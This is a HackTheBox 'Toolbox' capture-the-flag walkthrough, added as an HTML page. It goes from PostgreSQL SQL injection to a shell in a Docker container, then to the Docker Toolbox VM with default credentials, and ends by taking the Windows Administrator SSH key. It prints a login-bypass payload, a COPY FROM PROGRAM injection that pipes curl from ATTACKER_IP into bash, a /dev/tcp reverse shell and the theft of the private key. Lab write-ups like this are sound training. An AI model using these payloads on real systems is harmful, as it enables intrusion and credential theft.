@@ -1,0 +1,278 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - Toolbox</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item active">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+<h1>Toolbox (HTB – Easy)</h1>
+
+<p>
+Toolbox is a hybrid Windows/Linux machine that exposes an SQL‑injectable login panel backed by PostgreSQL.
+The SQL injection allows command execution, giving a shell inside a Docker container.  
+From there, the Docker Toolbox architecture reveals a VirtualBox‑based Docker host with default credentials.
+The host exposes the Windows filesystem, allowing retrieval of the Administrator SSH key and full compromise.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: toolbox.htb  
+<br>Initial vector: PostgreSQL SQL injection → RCE  
+<br>Lateral movement: Docker Toolbox VM (default creds)  
+<br>Privilege escalation: Windows Administrator SSH key from shared folder  
+</p>
+
+<h2>Enumeration</h2>
+
+<p>Nmap:</p>
+<pre>
+21/tcp   ftp (anonymous allowed)
+22/tcp   ssh (OpenSSH for Windows)
+443/tcp  https (Apache 2.4.38)
+445/tcp  smb
+5985/tcp WinRM
+</pre>
+
+<p>
+Anonymous FTP reveals:
+</p>
+
+<pre>
+docker-toolbox.exe
+</pre>
+
+<p>
+This strongly suggests the host uses Docker Toolbox, which runs Docker inside a VirtualBox VM and exposes
+Windows folders to the VM.
+</p>
+
+<p>
+The HTTPS site presents two domains:
+</p>
+
+<pre>
+megalogistic.com
+admin.megalogistic.com
+</pre>
+
+<p>
+Add both to <code>/etc/hosts</code>.  
+The admin panel at <code>admin.megalogistic.com</code> contains a login form vulnerable to SQL injection.
+</p>
+
+<h2>Foothold – PostgreSQL SQL Injection → RCE</h2>
+
+<p>
+Test the login form:
+</p>
+
+<pre>
+admin' or 1=1-- -
+</pre>
+
+<p>
+This bypasses authentication.  
+Logging out reveals an error message referencing PostgreSQL, confirming the backend DBMS.
+</p>
+
+<p>
+PostgreSQL allows command execution via <code>COPY ... FROM PROGRAM</code>.  
+Use Burp to intercept a login request and inject:
+</p>
+
+<pre>
+username=admin';
+COPY cmd_exec FROM PROGRAM 'curl http://ATTACKER_IP/test | bash';
+-- -
+&password=admin
+</pre>
+
+<p>
+Serve a reverse shell script:
+</p>
+
+<pre>
+#!/bin/bash
+bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
+</pre>
+
+<p>Listener:</p>
+<pre>
+$ nc -nlvp 443
+</pre>
+
+<p>
+Trigger the request and a shell is obtained — inside a Docker container.
+</p>
+
+<h2>Lateral Movement – Docker Toolbox VM</h2>
+
+<p>
+Check the container’s IP:</p>
+<pre>
+$ ifconfig
+-> 172.17.0.2
+</pre>
+
+<p>
+Docker Toolbox uses VirtualBox, and the Docker host is always at:
+</p>
+
+<pre>
+172.17.0.1
+</pre>
+
+<p>
+Test SSH connectivity:
+</p>
+
+<pre>
+$ echo '' > /dev/tcp/172.17.0.1/22 && echo OPEN
+</pre>
+
+<p>
+Default Docker Toolbox credentials:
+</p>
+
+<pre>
+docker : tcuser
+</pre>
+
+<p>
+SSH into the Docker host:
+</p>
+
+<pre>
+$ ssh docker@172.17.0.1
+Password: tcuser
+</pre>
+
+<p>
+The Docker VM automatically mounts the Windows host’s <code>C:\Users</code> directory under:
+</p>
+
+<pre>
+/c/Users
+</pre>
+
+<p>
+Navigate to the Administrator folder:
+</p>
+
+<pre>
+$ cd /c/Users/Administrator/.ssh
+</pre>
+
+<p>
+Retrieve <code>id_rsa</code> and copy it to your attacker machine:
+</p>
+
+<pre>
+$ scp docker@172.17.0.1:/c/Users/Administrator/.ssh/id_rsa .
+$ chmod 600 id_rsa
+</pre>
+
+<h2>Privilege Escalation – Windows Administrator</h2>
+
+<p>
+SSH directly into the Windows host:
+</p>
+
+<pre>
+$ ssh -i id_rsa administrator@toolbox.htb
+</pre>
+
+<p>
+Administrator access obtained.  
+Root flag is located on the Windows desktop.
+</p>
+
+<h2>Conclusion</h2>
+<p>
+Toolbox is a clever hybrid machine: PostgreSQL SQL injection leads to RCE inside a Docker container, which in
+turn exposes a VirtualBox‑based Docker Toolbox VM with default credentials.  
+Because the VM mounts the Windows host’s user directories, the Administrator SSH key is easily recovered,
+resulting in full system compromise.
+</p>
+
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
+
+
